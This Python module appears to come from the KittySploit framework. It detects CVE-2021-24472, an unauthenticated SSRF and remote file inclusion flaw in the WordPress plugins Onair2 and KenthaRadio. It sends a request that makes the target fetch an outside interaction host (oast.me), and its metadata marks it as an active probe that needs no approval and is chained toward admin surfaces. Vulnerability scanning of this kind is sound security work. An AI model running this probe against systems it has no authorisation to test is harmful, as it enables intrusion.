#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Onair2 < 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Request Forgery Detection',
        'description': 'Onair2 < 3.9.9.2 and KenthaRadio < 2.0.2 have exposed proxy functionality to unauthenticated users. Sending requests to this proxy functionality will have the web server fetch and display the content from any URI, allowing remote file inclusion and server-side request forgery.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'lfi', 'ssrf', 'wp', 'wp-plugin', 'wpscan', 'qantumthemes', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/17591ac5-88fa-4cae-a61a-4dcf5dc0b72a',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24472',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-24472',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp1/home-18/?qtproxycall=https://oast.me', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<h1> Interactsh Server </h1>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Request Forgery detected",
                path='/wp1/home-18/?qtproxycall=https://oast.me',
            )
            return True
        return False

